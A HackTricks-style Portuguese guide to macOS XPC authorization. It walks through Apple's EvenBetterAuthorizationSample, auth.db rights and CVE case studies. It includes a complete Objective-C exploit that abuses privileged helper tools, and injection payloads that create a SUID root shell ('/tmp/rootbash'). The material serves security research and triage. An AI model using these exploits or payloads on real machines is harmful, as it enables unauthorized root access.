# Autorização XPC

{{#include ../../../../../banners/hacktricks-training.md}}

## Autorização XPC

A Apple também fornece outra forma de autenticar se o processo conectado tem **permissão para chamar um método XPC exposto**.<sup>[[2]](#references)</sup>

Quando um aplicativo precisa **executar ações como um usuário privilegiado**, em vez de executar o aplicativo como um usuário privilegiado, ele geralmente instala como root um HelperTool como um serviço XPC que pode ser chamado pelo aplicativo para realizar essas ações. No entanto, o aplicativo que chama o serviço deve ter autorização suficiente.

### ShouldAcceptNewConnection sempre YES

Um exemplo pode ser encontrado em [EvenBetterAuthorizationSample](https://github.com/brenwell/EvenBetterAuthorizationSample). Em `App/AppDelegate.m`, ele tenta **conectar-se** ao **HelperTool**. Já em `HelperTool/HelperTool.m`, a função **`shouldAcceptNewConnection`** **não verifica** nenhum dos requisitos indicados anteriormente. Ela sempre retornará YES:<sup>[[1]](#references)</sup>
```objectivec
- (BOOL)listener:(NSXPCListener *)listener shouldAcceptNewConnection:(NSXPCConnection *)newConnection
// Called by our XPC listener when a new connection comes in.  We configure the connection
// with our protocol and ourselves as the main object.
{
assert(listener == self.listener);
#pragma unused(listener)
assert(newConnection != nil);

newConnection.exportedInterface = [NSXPCInterface interfaceWithProtocol:@protocol(HelperToolProtocol)];
newConnection.exportedObject = self;
[newConnection resume];

return YES;
}
```
Para obter mais informações sobre como configurar corretamente esta verificação:

{{#ref}}
macos-xpc-connecting-process-check/
{{#endref}}

### Direitos do aplicativo

No entanto, há alguma **autorização ocorrendo quando um método do HelperTool é chamado**.

A função **`applicationDidFinishLaunching`** de `App/AppDelegate.m` criará uma referência de autorização vazia após o app ser iniciado. Isso sempre deve funcionar.\
Em seguida, ela tentará **adicionar alguns direitos** a essa referência de autorização chamando `setupAuthorizationRights`:
```objectivec
- (void)applicationDidFinishLaunching:(NSNotification *)note
{
[...]
err = AuthorizationCreate(NULL, NULL, 0, &self->_authRef);
if (err == errAuthorizationSuccess) {
err = AuthorizationMakeExternalForm(self->_authRef, &extForm);
}
if (err == errAuthorizationSuccess) {
self.authorization = [[NSData alloc] initWithBytes:&extForm length:sizeof(extForm)];
}
assert(err == errAuthorizationSuccess);

// If we successfully connected to Authorization Services, add definitions for our default
// rights (unless they're already in the database).

if (self->_authRef) {
[Common setupAuthorizationRights:self->_authRef];
}

[self.window makeKeyAndOrderFront:self];
}
```
A função `setupAuthorizationRights` de `Common/Common.m` armazenará no banco de dados de autenticação `/var/db/auth.db` os direitos da aplicação. Observe que ela adicionará apenas os direitos que ainda não estão no banco de dados:
```objectivec
+ (void)setupAuthorizationRights:(AuthorizationRef)authRef
// See comment in header.
{
assert(authRef != NULL);
[Common enumerateRightsUsingBlock:^(NSString * authRightName, id authRightDefault, NSString * authRightDesc) {
OSStatus    blockErr;

// First get the right.  If we get back errAuthorizationDenied that means there's
// no current definition, so we add our default one.

blockErr = AuthorizationRightGet([authRightName UTF8String], NULL);
if (blockErr == errAuthorizationDenied) {
blockErr = AuthorizationRightSet(
authRef,                                    // authRef
[authRightName UTF8String],                 // rightName
(__bridge CFTypeRef) authRightDefault,      // rightDefinition
(__bridge CFStringRef) authRightDesc,       // descriptionKey
NULL,                                       // bundle (NULL implies main bundle)
CFSTR("Common")                             // localeTableName
);
assert(blockErr == errAuthorizationSuccess);
} else {
// A right already exists (err == noErr) or any other error occurs, we
// assume that it has been set up in advance by the system administrator or
// this is the second time we've run.  Either way, there's nothing more for
// us to do.
}
}];
}
```
A função `enumerateRightsUsingBlock` é usada para obter as permissões dos aplicativos, que são definidas em `commandInfo`:
```objectivec
static NSString * kCommandKeyAuthRightName    = @"authRightName";
static NSString * kCommandKeyAuthRightDefault = @"authRightDefault";
static NSString * kCommandKeyAuthRightDesc    = @"authRightDescription";

+ (NSDictionary *)commandInfo
{
static dispatch_once_t sOnceToken;
static NSDictionary *  sCommandInfo;

dispatch_once(&sOnceToken, ^{
sCommandInfo = @{
NSStringFromSelector(@selector(readLicenseKeyAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.readLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to read its license key.",
@"prompt shown when user is required to authorize to read the license key"
)
},
NSStringFromSelector(@selector(writeLicenseKey:authorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.writeLicenseKey",
kCommandKeyAuthRightDefault : @kAuthorizationRuleAuthenticateAsAdmin,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to write its license key.",
@"prompt shown when user is required to authorize to write the license key"
)
},
NSStringFromSelector(@selector(bindToLowNumberPortAuthorization:withReply:)) : @{
kCommandKeyAuthRightName    : @"com.example.apple-samplecode.EBAS.startWebService",
kCommandKeyAuthRightDefault : @kAuthorizationRuleClassAllow,
kCommandKeyAuthRightDesc    : NSLocalizedString(
@"EBAS is trying to start its web service.",
@"prompt shown when user is required to authorize to start the web service"
)
}
};
});
return sCommandInfo;
}

+ (NSString *)authorizationRightForCommand:(SEL)command
// See comment in header.
{
return [self commandInfo][NSStringFromSelector(command)][kCommandKeyAuthRightName];
}

+ (void)enumerateRightsUsingBlock:(void (^)(NSString * authRightName, id authRightDefault, NSString * authRightDesc))block
// Calls the supplied block with information about each known authorization right..
{
[self.commandInfo enumerateKeysAndObjectsUsingBlock:^(id key, id obj, BOOL *stop) {
#pragma unused(key)
#pragma unused(stop)
NSDictionary *  commandDict;
NSString *      authRightName;
id              authRightDefault;
NSString *      authRightDesc;

// If any of the following asserts fire it's likely that you've got a bug
// in sCommandInfo.

commandDict = (NSDictionary *) obj;
assert([commandDict isKindOfClass:[NSDictionary class]]);

authRightName = [commandDict objectForKey:kCommandKeyAuthRightName];
assert([authRightName isKindOfClass:[NSString class]]);

authRightDefault = [commandDict objectForKey:kCommandKeyAuthRightDefault];
assert(authRightDefault != nil);

authRightDesc = [commandDict objectForKey:kCommandKeyAuthRightDesc];
assert([authRightDesc isKindOfClass:[NSString class]]);

block(authRightName, authRightDefault, authRightDesc);
}];
}
```
Isso significa que, ao final desse processo, as permissões declaradas dentro de `commandInfo` serão armazenadas em `/var/db/auth.db`. Para **cada método** que **exigir autenticação**, o banco de dados conterá o **nome da permissão** e **`kCommandKeyAuthRightDefault`**. Este último **indica quem pode obter esse direito**.<sup>[[1]](#references)</sup>

Existem diferentes escopos para indicar quem pode acessar um direito. Alguns deles são definidos em [AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h) (você pode encontrar [todos eles aqui](https://www.dssw.co.uk/reference/authorization-rights/)), mas, resumidamente:<sup>[[9]](#references)[[10]](#references)</sup>

<table><thead><tr><th width="284.3333333333333">Name</th><th width="165">Value</th><th>Description</th></tr></thead><tbody><tr><td>kAuthorizationRuleClassAllow</td><td>allow</td><td>Qualquer pessoa</td></tr><tr><td>kAuthorizationRuleClassDeny</td><td>deny</td><td>Ninguém</td></tr><tr><td>kAuthorizationRuleIsAdmin</td><td>is-admin</td><td>O usuário atual precisa ser um administrador (estar no grupo de administradores)</td></tr><tr><td>kAuthorizationRuleAuthenticateAsSessionUser</td><td>authenticate-session-owner</td><td>Solicita que o usuário se autentique.</td></tr><tr><td>kAuthorizationRuleAuthenticateAsAdmin</td><td>authenticate-admin</td><td>Solicita que o usuário se autentique. Ele precisa ser um administrador (estar no grupo de administradores)</td></tr><tr><td>kAuthorizationRightRule</td><td>rule</td><td>Especifica regras</td></tr><tr><td>kAuthorizationComment</td><td>comment</td><td>Especifica comentários adicionais sobre o direito</td></tr></tbody></table>

### Verificação de permissões

Em `HelperTool/HelperTool.m`, a função **`readLicenseKeyAuthorization`** verifica se o caller está autorizado a **executar esse método**, chamando a função **`checkAuthorization`**. Essa função verificará se os **authData** enviados pelo processo chamador têm um **formato correto** e, em seguida, verificará **o que é necessário para obter o direito** de chamar o método específico. Se tudo ocorrer bem, o **`error` retornado será `nil`**:
```objectivec
- (NSError *)checkAuthorization:(NSData *)authData command:(SEL)command
{
[...]

// First check that authData looks reasonable.

error = nil;
if ( (authData == nil) || ([authData length] != sizeof(AuthorizationExternalForm)) ) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:paramErr userInfo:nil];
}

// Create an authorization ref from that the external form data contained within.

if (error == nil) {
err = AuthorizationCreateFromExternalForm([authData bytes], &authRef);

// Authorize the right associated with the command.

if (err == errAuthorizationSuccess) {
AuthorizationItem   oneRight = { NULL, 0, NULL, 0 };
AuthorizationRights rights   = { 1, &oneRight };

oneRight.name = [[Common authorizationRightForCommand:command] UTF8String];
assert(oneRight.name != NULL);

err = AuthorizationCopyRights(
authRef,
&rights,
NULL,
kAuthorizationFlagExtendRights | kAuthorizationFlagInteractionAllowed,
NULL
);
}
if (err != errAuthorizationSuccess) {
error = [NSError errorWithDomain:NSOSStatusErrorDomain code:err userInfo:nil];
}
}

if (authRef != NULL) {
junk = AuthorizationFree(authRef, 0);
assert(junk == errAuthorizationSuccess);
}

return error;
}
```
Para **verificar os requisitos para obter o direito** de chamar esse método, `authorizationRightForCommand` verifica o objeto **`commandInfo`** mencionado anteriormente. Em seguida, ele chama **`AuthorizationCopyRights`** para verificar **se o caller tem os direitos** para invocar a função (observe que as flags permitem a interação com o usuário).<sup>[[1]](#references)[[3]](#references)</sup>

Nesse caso, para chamar a função `readLicenseKeyAuthorization`, `kCommandKeyAuthRightDefault` é definido como `@kAuthorizationRuleClassAllow`. Portanto, **qualquer pessoa pode chamá-la**.

### Informações do DB

Foi mencionado que essas informações são armazenadas em `/var/db/auth.db`. Você pode listar todas as rules armazenadas com:
```sql
sudo sqlite3 /var/db/auth.db
SELECT name FROM rules;
SELECT name FROM rules WHERE name LIKE '%safari%';
```
Então, você pode ler quem pode acessar o direito com:
```bash
security authorizationdb read com.apple.safaridriver.allow
```
### Direitos permissivos

Você pode encontrar **todas as configurações de permissões** [**aqui**](https://www.dssw.co.uk/reference/authorization-rights/), mas as combinações que não exigirão interação do usuário seriam:<sup>[[10]](#references)</sup>

1. **'authenticate-user': 'false'**
- Esta é a chave mais direta. Se definida como `false`, especifica que um usuário não precisa fornecer autenticação para obter este direito.
- Ela é usada **em combinação com uma das 2 opções abaixo ou indicando um grupo** ao qual o usuário deve pertencer.
2. **'allow-root': 'true'**
- Se um usuário estiver operando como root (que possui permissões elevadas) e esta chave estiver definida como `true`, o usuário root poderá potencialmente obter este direito sem autenticação adicional. No entanto, normalmente, obter o status de usuário root já exige autenticação, portanto este não é um cenário de "sem autenticação" para a maioria dos usuários.
3. **'session-owner': 'true'**
- Se definida como `true`, o proprietário da sessão (o usuário atualmente conectado) obterá automaticamente este direito. Isso pode ignorar uma autenticação adicional se o usuário já estiver conectado.
4. **'shared': 'true'**
- Esta chave não concede direitos sem autenticação. Em vez disso, se definida como `true`, significa que, depois que o direito for autenticado, ele poderá ser compartilhado entre vários processos sem que cada um precise se autenticar novamente. No entanto, a concessão inicial do direito ainda exigirá autenticação, a menos que seja combinada com outras chaves, como `'authenticate-user': 'false'`.

Você pode [**usar este script**](https://gist.github.com/carlospolop/96ecb9e385a4667b9e40b24e878652f9) para obter os direitos interessantes:
```bash
Rights with 'authenticate-user': 'false':
is-admin (admin), is-admin-nonshared (admin), is-appstore (_appstore), is-developer (_developer), is-lpadmin (_lpadmin), is-root (run as root), is-session-owner (session owner), is-webdeveloper (_webdeveloper), system-identity-write-self (session owner), system-install-iap-software (run as root), system-install-software-iap (run as root)

Rights with 'allow-root': 'true':
com-apple-aosnotification-findmymac-remove, com-apple-diskmanagement-reservekek, com-apple-openscripting-additions-send, com-apple-reportpanic-fixright, com-apple-servicemanagement-blesshelper, com-apple-xtype-fontmover-install, com-apple-xtype-fontmover-remove, com-apple-dt-instruments-process-analysis, com-apple-dt-instruments-process-kill, com-apple-pcastagentconfigd-wildcard, com-apple-trust-settings-admin, com-apple-wifivelocity, com-apple-wireless-diagnostics, is-root, system-install-iap-software, system-install-software, system-install-software-iap, system-preferences, system-preferences-accounts, system-preferences-datetime, system-preferences-energysaver, system-preferences-network, system-preferences-printing, system-preferences-security, system-preferences-sharing, system-preferences-softwareupdate, system-preferences-startupdisk, system-preferences-timemachine, system-print-operator, system-privilege-admin, system-services-networkextension-filtering, system-services-networkextension-vpn, system-services-systemconfiguration-network, system-sharepoints-wildcard

Rights with 'session-owner': 'true':
authenticate-session-owner, authenticate-session-owner-or-admin, authenticate-session-user, com-apple-safari-allow-apple-events-to-run-javascript, com-apple-safari-allow-javascript-in-smart-search-field, com-apple-safari-allow-unsigned-app-extensions, com-apple-safari-install-ephemeral-extensions, com-apple-safari-show-credit-card-numbers, com-apple-safari-show-passwords, com-apple-icloud-passwordreset, com-apple-icloud-passwordreset, is-session-owner, system-identity-write-self, use-login-window-ui
```
### Estudos de Caso de Bypass de Authorization

- **CVE-2025-65842 – Acustica Audio Aquarius HelperTool**: O serviço Mach privilegiado `com.acustica.HelperTool` aceita todas as conexões, e sua rotina `checkAuthorization:` chama `AuthorizationCopyRights(NULL, …)`, portanto qualquer blob de 32 bytes é aceito. Em seguida, `executeCommand:authorization:withReply:` envia strings separadas por vírgulas, controladas pelo atacante, para `NSTask` como root, permitindo payloads como:
```bash
"/bin/sh,-c,cp /bin/bash /tmp/rootbash && chmod +s /tmp/rootbash"
```
criar trivialmente um SUID root shell. Detalhes [neste write-up](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/).<sup>[[6]](#references)</sup>
- **CVE-2025-55076 – Plugin Alliance InstallationHelper**: O listener sempre retorna YES, e o mesmo padrão NULL de `AuthorizationCopyRights` aparece em `checkAuthorization:`. O método `exchangeAppWithReply:` concatena input controlado pelo atacante em uma string `system()` duas vezes; portanto, injetar shell metacharacters em `appPath` (por exemplo, `"/Applications/Test.app";chmod 4755 /tmp/rootbash;`) resulta em execução de código como root por meio do Mach service `com.plugin-alliance.pa-installationhelper`. Mais informações [aqui](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/).<sup>[[7]](#references)</sup>
- **CVE-2024-4395 – Jamf Compliance Editor helper**: A execução de uma auditoria cria `/Library/LaunchDaemons/com.jamf.complianceeditor.helper.plist`, expõe o Mach service `com.jamf.complianceeditor.helper` e exporta `-executeScriptAt:arguments:then:` sem verificar o `AuthorizationExternalForm` ou a code signature do caller. Um exploit trivial executa `AuthorizationCreate` com uma referência vazia, conecta-se usando `[[NSXPCConnection alloc] initWithMachServiceName:options:NSXPCConnectionPrivileged]` e invoca o método para executar binaries arbitrários como root. As notas completas de reversing (junto com o PoC) estão no [write-up de Mykola Grymalyuk](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html).<sup>[[4]](#references)</sup>
- **CVE-2025-25251 – FortiClient Mac helper**: O FortiClient Mac 7.0.0–7.0.14, 7.2.0–7.2.8 e 7.4.0–7.4.2 aceitava mensagens XPC criadas especialmente que alcançavam um helper privilegiado sem authorization gates. Como o helper confiava em seu próprio `AuthorizationRef` privilegiado, qualquer usuário local capaz de enviar mensagens ao service podia induzi-lo a executar alterações arbitrárias de configuração ou comandos como root. Detalhes no [resumo do advisory da SentinelOne](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/).<sup>[[5]](#references)</sup>

#### Dicas de triagem rápida

- Quando um app inclui tanto uma GUI quanto um helper, compare seus requisitos de código e verifique se `shouldAcceptNewConnection` bloqueia o listener com `-setCodeSigningRequirement:` (ou valida `SecCodeCopySigningInformation`). A ausência dessas verificações geralmente resulta em cenários CWE-863, como no caso do Jamf. Uma análise rápida se parece com:
```bash
codesign --display --requirements - /Applications/Jamf\ Compliance\ Editor.app
```
- Compare o que o helper *pensa* que está autorizando com o que o client fornece. Ao fazer reversing, defina um breakpoint em `AuthorizationCopyRights` e confirme que o `AuthorizationRef` se origina de `AuthorizationCreateFromExternalForm` (fornecido pelo client), em vez do próprio contexto privilegiado do helper; caso contrário, você provavelmente encontrou um padrão CWE-863 semelhante aos casos anteriores.

## Reversing Authorization

### Verificando se EvenBetterAuthorization é usado

Se você encontrar a função: **`[HelperTool checkAuthorization:command:]`**, provavelmente o processo está usando o schema de autorização mencionado anteriormente:

<figure><img src="../../../../../images/image (42).png" alt=""><figcaption></figcaption></figure>

Se essa função chamar APIs como `AuthorizationCreateFromExternalForm`, `authorizationRightForCommand`, `AuthorizationCopyRights` e `AuthorizationFree`, ela estará usando o padrão [**EvenBetterAuthorizationSample**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L101-L154).

Verifique o **`/var/db/auth.db`** para ver se é possível obter permissões para chamar alguma ação privilegiada sem interação do usuário.

### Comunicação de Protocol

Em seguida, você precisa encontrar o schema do protocol para poder estabelecer uma comunicação com o serviço XPC.

A função **`shouldAcceptNewConnection`** indica o protocol que está sendo exportado:

<figure><img src="../../../../../images/image (44).png" alt=""><figcaption></figcaption></figure>

Neste caso, temos o mesmo que no EvenBetterAuthorizationSample; [**verifique esta linha**](https://github.com/brenwell/EvenBetterAuthorizationSample/blob/e1052a1855d3a5e56db71df5f04e790bfd4389c4/HelperTool/HelperTool.m#L94).

Sabendo o nome do protocol usado, é possível **dump a definição do header** com:
```bash
class-dump /Library/PrivilegedHelperTools/com.example.HelperTool

[...]
@protocol HelperToolProtocol
- (void)overrideProxySystemWithAuthorization:(NSData *)arg1 setting:(NSDictionary *)arg2 reply:(void (^)(NSError *))arg3;
- (void)revertProxySystemWithAuthorization:(NSData *)arg1 restore:(BOOL)arg2 reply:(void (^)(NSError *))arg3;
- (void)legacySetProxySystemPreferencesWithAuthorization:(NSData *)arg1 enabled:(BOOL)arg2 host:(NSString *)arg3 port:(NSString *)arg4 reply:(void (^)(NSError *, BOOL))arg5;
- (void)getVersionWithReply:(void (^)(NSString *))arg1;
- (void)connectWithEndpointReply:(void (^)(NSXPCListenerEndpoint *))arg1;
@end
[...]
```
Por fim, só precisamos saber o **nome do Mach Service exposto** para estabelecer uma comunicação com ele. Há várias maneiras de descobrir isso:

- Em **`[HelperTool init]`**, onde é possível ver o Mach Service sendo usado:

<figure><img src="../../../../../images/image (41).png" alt=""><figcaption></figcaption></figure>

- No plist do launchd:
```xml
cat /Library/LaunchDaemons/com.example.HelperTool.plist

[...]

<key>MachServices</key>
<dict>
<key>com.example.HelperTool</key>
<true/>
</dict>
[...]
```
### Exemplo de Exploit

Neste exemplo, são criados:

- A definição do protocolo com as funções
- Uma auth vazia para solicitar acesso
- Uma conexão com o XPC service
- Uma chamada à função caso a conexão seja bem-sucedida
```objectivec
// gcc -framework Foundation -framework Security expl.m -o expl

#import <Foundation/Foundation.h>
#import <Security/Security.h>

// Define a unique service name for the XPC helper
static NSString* XPCServiceName = @"com.example.XPCHelper";

// Define the protocol for the helper tool
@protocol XPCHelperProtocol
- (void)applyProxyConfigWithAuthorization:(NSData *)authData settings:(NSDictionary *)settings reply:(void (^)(NSError *))callback;
- (void)resetProxyConfigWithAuthorization:(NSData *)authData restoreDefault:(BOOL)shouldRestore reply:(void (^)(NSError *))callback;
- (void)legacyConfigureProxyWithAuthorization:(NSData *)authData enabled:(BOOL)isEnabled host:(NSString *)hostAddress port:(NSString *)portNumber reply:(void (^)(NSError *, BOOL))callback;
- (void)fetchVersionWithReply:(void (^)(NSString *))callback;
- (void)establishConnectionWithReply:(void (^)(NSXPCListenerEndpoint *))callback;
@end

int main(void) {
NSData *authData;
OSStatus status;
AuthorizationExternalForm authForm;
AuthorizationRef authReference = {0};
NSString *proxyAddress = @"127.0.0.1";
NSString *proxyPort = @"4444";
Boolean isProxyEnabled = true;

// Create an empty authorization reference
status = AuthorizationCreate(NULL, kAuthorizationEmptyEnvironment, kAuthorizationFlagDefaults, &authReference);
const char* errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);

// Convert the authorization reference to an external form
if (status == errAuthorizationSuccess) {
status = AuthorizationMakeExternalForm(authReference, &authForm);
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Convert the external form to NSData for transmission
if (status == errAuthorizationSuccess) {
authData = [[NSData alloc] initWithBytes:&authForm length:sizeof(authForm)];
errorMsg = CFStringGetCStringPtr(SecCopyErrorMessageString(status, nil), kCFStringEncodingMacRoman);
NSLog(@"OSStatus: %s", errorMsg);
}

// Ensure the authorization was successful
assert(status == errAuthorizationSuccess);

// Establish an XPC connection
NSString *serviceName = XPCServiceName;
NSXPCConnection *xpcConnection = [[NSXPCConnection alloc] initWithMachServiceName:serviceName options:0x1000];
NSXPCInterface *xpcInterface = [NSXPCInterface interfaceWithProtocol:@protocol(XPCHelperProtocol)];
[xpcConnection setRemoteObjectInterface:xpcInterface];
[xpcConnection resume];

// Handle errors for the XPC connection
id remoteProxy = [xpcConnection remoteObjectProxyWithErrorHandler:^(NSError *error) {
NSLog(@"[-] Connection error");
NSLog(@"[-] Error: %@", error);
}];

// Log the remote proxy and connection objects
NSLog(@"Remote Proxy: %@", remoteProxy);
NSLog(@"XPC Connection: %@", xpcConnection);

// Use the legacy method to configure the proxy
[remoteProxy legacyConfigureProxyWithAuthorization:authData enabled:isProxyEnabled host:proxyAddress port:proxyPort reply:^(NSError *error, BOOL success) {
NSLog(@"Response: %@", error);
}];

// Allow some time for the operation to complete
[NSThread sleepForTimeInterval:10.0f];

NSLog(@"Finished!");
}
```
## Outros privilege helpers XPC abusados

- [https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)<sup>[[8]](#references)</sup>

## References

- [1] [Apple Developer — EvenBetterAuthorizationSample](https://developer.apple.com/library/archive/samplecode/EvenBetterAuthorizationSample/Introduction/Intro.html) ([mirror on GitHub](https://github.com/brenwell/EvenBetterAuthorizationSample))
- [2] [Apple Developer — Serviços de autorização](https://developer.apple.com/documentation/security/authorization-services)
- [3] [Apple Developer — `AuthorizationCopyRights`](https://developer.apple.com/documentation/security/authorizationcopyrights(_:_:_:_:_:))
- [4] [CVE-2024-4395: Escalada de privilégios no Jamf Compliance Editor](https://khronokernel.com/macos/2024/05/01/CVE-2024-4395.html)
- [5] [CVE-2025-25251: Falha de escalada de privilégios no FortiClient para Mac](https://www.sentinelone.com/vulnerability-database/cve-2025-25251/)
- [6] [CVE-2025-65842 – Escalada local de privilégios no serviço XPC do Acustica Audio HelperTool no Aquarius Desktop para macOS](https://almightysec.com/helpertool-xpc-service-local-privilege-escalation/)
- [7] [CVE-2025-55076 – Escalada local de privilégios no serviço XPC do Plugin Alliance InstallationHelper](https://almightysec.com/Plugin-Alliance-HelperTool-XPC-Service-Local-Privilege-Escalation/)
- [8] [CVE-2019-8805: Escalada de privilégios no framework Apple EndpointSecurity (SecureLayer7)](https://blog.securelayer7.net/applied-endpointsecurity-framework-previlege-escalation/?utm_source=pocket_shared)
- [9] [Apple Open Source — AuthorizationDB.h](https://github.com/aosm/Security/blob/master/Security/libsecurity_authorization/lib/AuthorizationDB.h)
- [10] [Referência de direitos de autorização (dssw.co.uk)](https://www.dssw.co.uk/reference/authorization-rights/)
{{#include ../../../../../banners/hacktricks-training.md}}
